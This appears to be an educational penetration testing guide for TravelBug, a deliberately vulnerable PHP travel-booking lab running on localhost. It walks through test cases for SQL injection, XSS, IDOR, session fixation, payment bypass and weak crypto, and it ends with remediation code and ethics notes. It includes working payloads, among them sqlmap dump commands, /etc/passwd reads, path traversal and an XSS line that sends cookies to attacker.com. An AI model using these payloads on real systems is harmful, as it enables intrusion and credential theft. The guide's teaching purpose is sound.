# **TravelBug Penetration Testing Guide**

## **Document Information**
- **Application:** TravelBug - Vulnerable Travel Booking System
- **Version:** 1.0
- **Purpose:** Educational Cybersecurity Lab
- **Test Environment:** Local Development (XAMPP/LAMP)
- **Audience:** Cybersecurity Students, Penetration Testers

---

## **Table of Contents**

1. **Executive Summary**
2. **Scope & Objectives**
3. **Methodology**
4. **Test Environment Setup**
5. **Reconnaissance Phase**
6. **Authentication Testing**
7. **Authorization Testing**
8. **Input Validation Testing**
9. **Session Management Testing**
10. **Cryptography Testing**
11. **Business Logic Testing**
12. **API Testing**
13. **Reporting Guidelines**
14. **Remediation Recommendations**
15. **Appendix**

---

## **1. Executive Summary**

**TravelBug** is a deliberately vulnerable travel booking application designed for cybersecurity education. This guide provides a structured approach to identifying and exploiting security vulnerabilities while maintaining professional testing standards.

**Key Vulnerabilities Introduced:**
- SQL Injection (Multiple vectors)
- Cross-Site Scripting (XSS)
- Insecure Direct Object References (IDOR)
- Weak Cryptographic Implementations
- Broken Authentication Mechanisms
- Cross-Site Request Forgery (CSRF)
- Sensitive Data Exposure
- Security Misconfigurations

---

## **2. Scope & Objectives**

### **In-Scope Components:**
- Web application interface (HTML, CSS, JavaScript)
- PHP backend functionality
- MySQL database interactions
- User authentication flows
- Payment processing system
- Admin management panel
- API endpoints

### **Out-of-Scope Components:**
- Network infrastructure attacks
- Denial of Service (DoS) attacks
- Physical security testing
- Social engineering

### **Objectives:**
1. Identify and document all security vulnerabilities
2. Demonstrate exploitation techniques
3. Provide risk assessment for each finding
4. Suggest remediation strategies
5. Create comprehensive test report

---

## **3. Methodology**

### **OWASP Testing Framework:**
- **OTG-INFO:** Information Gathering
- **OTG-INPVAL:** Input Validation Testing
- **OTG-AUTHN:** Authentication Testing
- **OTG-AUTHZ:** Authorization Testing
- **OTG-SESS:** Session Management Testing
- **OTG-CRYPST:** Cryptography Testing
- **OTG-ERR:** Error Handling Testing
- **OTG-BUSLOGIC:** Business Logic Testing

### **Testing Phases:**
1. **Planning & Reconnaissance**
2. **Vulnerability Discovery**
3. **Exploitation & Validation**
4. **Analysis & Reporting**

---

## **4. Test Environment Setup**

### **4.1 Prerequisites:**
```bash
# Required Tools
- Kali Linux or Parrot OS
- Burp Suite Professional/Community
- OWASP ZAP
- SQLMap
- Nikto
- Nmap
- Custom wordlists
- Browser Developer Tools
```

### **4.2 Installation:**
```bash
# Clone and setup TravelBug
cd /opt/lampp/htdocs/cybersec-portal/labs/
mkdir -p travelbug
# Copy all generated files to this directory

# Start services
sudo systemctl start apache2
sudo systemctl start mysql

# Initialize database
mysql -u root -p < database/travelbug.sql
# OR visit: http://localhost/travelbug/config/setup.php
```

### **4.3 Configuration:**
```bash
# Burp Suite Proxy Setup
1. Start Burp Suite
2. Configure browser proxy: 127.0.0.1:8080
3. Install Burp's CA certificate
4. Set scope: http://localhost/travelbug/*
```

---

## **5. Reconnaissance Phase**

### **Test Case 5.1: Information Gathering**
```http
GET /travelbug/ HTTP/1.1
Host: localhost
```

**Test Steps:**
1. Spider the application using Burp Suite
2. Identify all endpoints and parameters
3. Analyze HTTP headers and cookies
4. Check for exposed files and directories
5. Identify technology stack

**Tools:**
```bash
# Directory Bruteforce
gobuster dir -u http://localhost/travelbug -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Technology Detection
whatweb http://localhost/travelbug

# Port Scanning
nmap -sV -p 80,443,3306 localhost
```

**Expected Findings:**
- PHP version exposure
- Directory listings (if enabled)
- Backup files (.bak, .old)
- Exposed configuration files

---

## **6. Authentication Testing**

### **Test Case 6.1: Weak Password Policy**
**Target:** `/travelbug/auth/register.php`

**Test Steps:**
1. Attempt registration with weak passwords
2. Test minimum password length requirements
3. Check for common password patterns
4. Test password complexity requirements

**Exploitation:**
```sql
-- Check for MD5 hashing
SELECT * FROM users WHERE password = MD5('admin123');
```

**Expected Findings:**
- MD5 password hashing (easily crackable)
- No password complexity requirements
- No account lockout mechanism

### **Test Case 6.2: Credential Enumeration**
**Target:** `/travelbug/auth/login.php`

**Test Steps:**
1. Test for different error messages
2. Attempt login with known users
3. Test timing attacks
4. Check for username enumeration

**Exploitation:**
```http
POST /travelbug/auth/login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpass
username=nonexistent&password=wrongpass
```

### **Test Case 6.3: Password Reset Vulnerabilities**
**Target:** User profile functionality

**Test Steps:**
1. Test password change without current password
2. Attempt to change other users' passwords
3. Check for password confirmation bypass

---

## **7. Authorization Testing**

### **Test Case 7.1: Insecure Direct Object References (IDOR)**
**Target:** `/travelbug/bookings/view.php?id=`

**Test Steps:**
1. Access booking details by modifying ID parameter
2. Attempt to access other users' bookings
3. Test for authorization bypass in API endpoints

**Exploitation:**
```http
GET /travelbug/bookings/view.php?id=1 HTTP/1.1
GET /travelbug/bookings/view.php?id=2 HTTP/1.1
GET /travelbug/bookings/view.php?id=999 HTTP/1.1
```

**Expected Findings:**
- No authorization checks on booking IDs
- Users can view any booking by ID manipulation

### **Test Case 7.2: Privilege Escalation**
**Target:** Admin panel access

**Test Steps:**
1. Attempt to access `/travelbug/admin/dashboard.php` as regular user
2. Test URL parameter manipulation for role changes
3. Check for client-side authorization only

**Exploitation:**
```http
GET /travelbug/admin/dashboard.php HTTP/1.1
Cookie: PHPSESSID=user_session_id
```

### **Test Case 7.3: Horizontal Privilege Escalation**
**Target:** User profile editing

**Test Steps:**
1. Attempt to modify other users' profiles
2. Test mass assignment vulnerabilities
3. Check for proper user session validation

---

## **8. Input Validation Testing**

### **Test Case 8.1: SQL Injection (Time-Based)**
**Target:** `/travelbug/flights/search.php`

**Test Steps:**
1. Identify vulnerable parameters
2. Test for boolean-based SQLi
3. Test for time-based SQLi
4. Attempt UNION-based extraction

**Exploitation:**
```sql
-- Basic SQL Injection
' OR '1'='1
' UNION SELECT NULL,NULL,NULL-- 

-- Time-Based SQL Injection
' OR SLEEP(5)-- 
' OR IF(1=1,SLEEP(5),0)-- 

-- Extract database information
' UNION SELECT version(),database(),user()-- 
```

**Using SQLMap:**
```bash
sqlmap -u "http://localhost/travelbug/flights/search.php?from=test&to=test" --dbs
sqlmap -u "http://localhost/travelbug/flights/search.php?from=test&to=test" -D travelbug --tables
sqlmap -u "http://localhost/travelbug/flights/search.php?from=test&to=test" -D travelbug -T users --dump
```

### **Test Case 8.2: Cross-Site Scripting (XSS)**
**Target:** Search fields, user inputs, profile fields

**Test Steps:**
1. Test for reflected XSS
2. Test for stored XSS
3. Test DOM-based XSS
4. Test for XSS in different contexts

**Payloads:**
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Advanced XSS -->
"><script>document.location='http://attacker.com/?c='+document.cookie</script>
javascript:alert(document.cookie)

<!-- Bypass attempts -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x oneRror=alert('XSS')>
```

### **Test Case 8.3: Command Injection**
**Target:** File uploads, system calls

**Test Steps:**
1. Test for OS command injection
2. Test for PHP code injection
3. Test for file inclusion vulnerabilities

**Payloads:**
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
```

---

## **9. Session Management Testing**

### **Test Case 9.1: Session Fixation**
**Target:** Login mechanism

**Test Steps:**
1. Obtain session ID before login
2. Use same session ID after login
3. Test if session ID changes after authentication

**Exploitation:**
```http
# Step 1: Get session ID
GET /travelbug/auth/login.php HTTP/1.1
Cookie: PHPSESSID=attacker_session

# Step 2: Victim logs in with same session
POST /travelbug/auth/login.php HTTP/1.1
Cookie: PHPSESSID=attacker_session

username=victim&password=victim_pass
```

### **Test Case 9.2: Session Timeout**
**Test Steps:**
1. Test session expiration time
2. Check if sessions persist after logout
3. Test concurrent sessions

### **Test Case 9.3: Cookie Security**
**Test Steps:**
1. Check for secure flag on cookies
2. Check for HttpOnly flag
3. Verify SameSite attribute
4. Test cookie scope

**Expected Findings:**
- Missing Secure flag
- Missing HttpOnly flag
- Predictable session IDs

---

## **10. Cryptography Testing**

### **Test Case 10.1: Weak Encryption**
**Target:** Payment card storage

**Test Steps:**
1. Analyze encryption methods
2. Test for use of base64 as "encryption"
3. Check for hardcoded encryption keys
4. Test for weak cryptographic algorithms

**Exploitation:**
```php
// Example of weak encryption in TravelBug
$encrypted = base64_encode($card_number);
$decrypted = base64_decode($encrypted_data);
```

### **Test Case 10.2: Insecure Transmission**
**Test Steps:**
1. Check for HTTPS enforcement
2. Test for mixed content
3. Verify TLS configuration
4. Check for certificate validation

### **Test Case 10.3: Password Storage**
**Test Steps:**
1. Analyze password hashing algorithms
2. Check for salting
3. Test hash complexity
4. Attempt password cracking

**Tools:**
```bash
# Extract password hashes
echo "admin:21232f297a57a5a743894a0e4a801fc3" > hashes.txt

# Crack with John
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack with Hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## **11. Business Logic Testing**

### **Test Case 11.1: Payment Bypass**
**Target:** `/travelbug/payments/create.php`

**Test Steps:**
1. Test booking confirmation without payment
2. Attempt to modify payment amounts
3. Test negative price values
4. Check for race conditions

**Exploitation:**
```http
POST /travelbug/bookings/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

flight_id=1&price=-100&confirm=1
```

### **Test Case 11.2: Inventory Manipulation**
**Test Steps:**
1. Test for negative seat/room quantities
2. Attempt to overbook flights/hotels
3. Test price manipulation
4. Check for availability race conditions

### **Test Case 11.3: Workflow Bypass**
**Test Steps:**
1. Skip booking steps
2. Access confirmation pages directly
3. Test parameter manipulation in multi-step processes

---

## **12. API Testing**

### **Test Case 12.1: Insecure API Endpoints**
**Target:** `/travelbug/api/get_flight.php`

**Test Steps:**
1. Test for authentication bypass
2. Test parameter manipulation
3. Check for rate limiting
4. Test for information disclosure

**Exploitation:**
```http
GET /travelbug/api/get_flight.php?id=1 HTTP/1.1
GET /travelbug/api/get_flight.php?id=1' OR '1'='1 HTTP/1.1
GET /travelbug/api/get_hotel.php?id=1 UNION SELECT * FROM users-- HTTP/1.1
```

### **Test Case 12.2: Mass Assignment**
**Target:** User registration/profile update

**Test Steps:**
1. Test for ability to set admin role
2. Attempt to modify sensitive fields
3. Test for parameter pollution

**Exploitation:**
```http
POST /travelbug/auth/register.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@test.com&password=pass123&role=admin
```

---

## **13. Reporting Guidelines**

### **13.1 Vulnerability Severity Classification:**

| Severity | CVSS Score | Description |
|----------|------------|-------------|
| Critical | 9.0-10.0 | Immediate threat to system integrity |
| High     | 7.0-8.9   | Significant security impact |
| Medium   | 4.0-6.9   | Moderate security impact |
| Low      | 0.1-3.9   | Minor security impact |
| Info     | 0.0       | Informational findings |

### **13.2 Report Template:**
```markdown
# Vulnerability Report: [Vulnerability Name]

## Executive Summary
[Brief description of the vulnerability]

## Technical Details
- **Vulnerability Type:** [SQLi, XSS, etc.]
- **Risk Rating:** [Critical/High/Medium/Low]
- **CVSS Score:** [X.X]
- **Affected Component:** [URL/Endpoint]
- **Attack Vector:** [Network/Adjacent/Local/Physical]

## Proof of Concept
### Steps to Reproduce:
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Request/Response:
```http
[HTTP request/response example]
```

## Impact Analysis
- **Confidentiality Impact:** [High/Medium/Low/None]
- **Integrity Impact:** [High/Medium/Low/None]
- **Availability Impact:** [High/Medium/Low/None]

## Remediation Recommendations
1. [Recommendation 1]
2. [Recommendation 2]
3. [Recommendation 3]

## References
- [OWASP Reference]
- [CWE Reference]
- [Additional Resources]
```

### **13.3 Sample Report - SQL Injection:**
```markdown
# Vulnerability Report: SQL Injection in Flight Search

## Executive Summary
The flight search functionality is vulnerable to SQL injection attacks, allowing attackers to extract sensitive database information including user credentials and payment details.

## Technical Details
- **Vulnerability Type:** SQL Injection (Time-Based)
- **Risk Rating:** Critical
- **CVSS Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Affected Component:** /travelbug/flights/search.php
- **Parameters Affected:** from, to, departure

## Proof of Concept
### Steps to Reproduce:
1. Navigate to flight search page
2. Enter payload in search fields
3. Observe delayed response

### Exploitation:
```http
GET /travelbug/flights/search.php?from=test&to=test' OR SLEEP(5)-- &departure=2024-01-01 HTTP/1.1
Host: localhost

# Database extraction
GET /travelbug/flights/search.php?from=test&to=test' UNION SELECT username,password,NULL,NULL,NULL,NULL FROM users-- HTTP/1.1
```

## Impact Analysis
- **Confidentiality Impact:** High (Database extraction)
- **Integrity Impact:** High (Data manipulation)
- **Availability Impact:** Medium (Potential DoS)

## Remediation Recommendations
1. Use prepared statements with parameterized queries
2. Implement input validation and sanitization
3. Apply principle of least privilege to database user
4. Implement WAF rules to block SQLi patterns

## References
- OWASP: https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
```

---

## **14. Remediation Recommendations**

### **14.1 SQL Injection:**
```php
// BAD
$sql = "SELECT * FROM users WHERE id = $id";

// GOOD
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

### **14.2 XSS Protection:**
```php
// Always escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// Set secure headers
header("Content-Security-Policy: default-src 'self'");
header("X-XSS-Protection: 1; mode=block");
```

### **14.3 Authentication Security:**
```php
// Use strong password hashing
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verify passwords
if (password_verify($password, $hash)) {
    // Valid password
}
```

### **14.4 Session Security:**
```php
// Secure session configuration
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
session_regenerate_id(true);
```

### **14.5 Input Validation:**
```php
// Validate and sanitize all inputs
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
$int_id = filter_var($_POST['id'], FILTER_VALIDATE_INT);

// Use whitelist approach
$allowed_types = ['flight', 'hotel'];
if (in_array($_POST['type'], $allowed_types)) {
    // Process
}
```

---

## **15. Appendix**

### **15.1 Testing Checklist:**
- [ ] Information Gathering Complete
- [ ] Authentication Testing Complete
- [ ] Authorization Testing Complete
- [ ] SQL Injection Testing Complete
- [ ] XSS Testing Complete
- [ ] Session Testing Complete
- [ ] Cryptography Testing Complete
- [ ] Business Logic Testing Complete
- [ ] API Testing Complete
- [ ] All Findings Documented
- [ ] Risk Assessment Completed
- [ ] Remediation Suggestions Provided

### **15.2 Tools Cheat Sheet:**
```bash
# SQL Injection
sqlmap -u "URL" --risk=3 --level=5 --batch

# XSS Testing
xsstrike -u "URL" --crawl

# Directory Bruteforce
gobuster dir -u URL -w wordlist.txt -x php,html,txt

# SSL/TLS Testing
sslscan localhost:443
testssl.sh localhost

# Vulnerability Scanning
nikto -h http://localhost/travelbug
```

### **15.3 Useful Payloads:**
```sql
-- SQL Injection
' OR '1'='1
' UNION SELECT NULL-- 
' OR SLEEP(5)-- 
' OR IF(1=1,SLEEP(5),0)-- 

-- XSS Payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

-- Command Injection
; ls -la
| cat /etc/passwd
`whoami`
$(id)

-- Path Traversal
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
```

### **15.4 Legal & Ethical Considerations:**
1. **Authorization Required:** Only test systems you own or have written permission to test
2. **Scope Limitation:** Stay within defined testing boundaries
3. **Data Protection:** Do not access or exfiltrate real user data
4. **Non-Destructive:** Avoid actions that could damage systems
5. **Documentation:** Keep detailed records of all testing activities
6. **Disclosure:** Follow responsible disclosure practices
7. **Compliance:** Adhere to relevant laws and regulations

---

## **Final Notes**

This penetration testing guide provides a comprehensive framework for assessing the TravelBug application. Remember that this is an educational lab designed to teach security concepts in a controlled environment.

**Key Principles:**
1. **Methodology First:** Follow structured testing approaches
2. **Documentation:** Record all findings and steps
3. **Ethical Conduct:** Always obtain proper authorization
4. **Continuous Learning:** Security is an evolving field
5. **Responsible Disclosure:** Report findings appropriately

**For Educational Use Only:** This guide is intended for cybersecurity education in controlled environments. Always obtain proper authorization before testing any systems.

---

**Last Updated:** 2026  
**Version:** 1.0  
**Prepared By:** Faisal Imran Auchan  
**Contact:** linkedin.com/in/faisal-imran-auchan
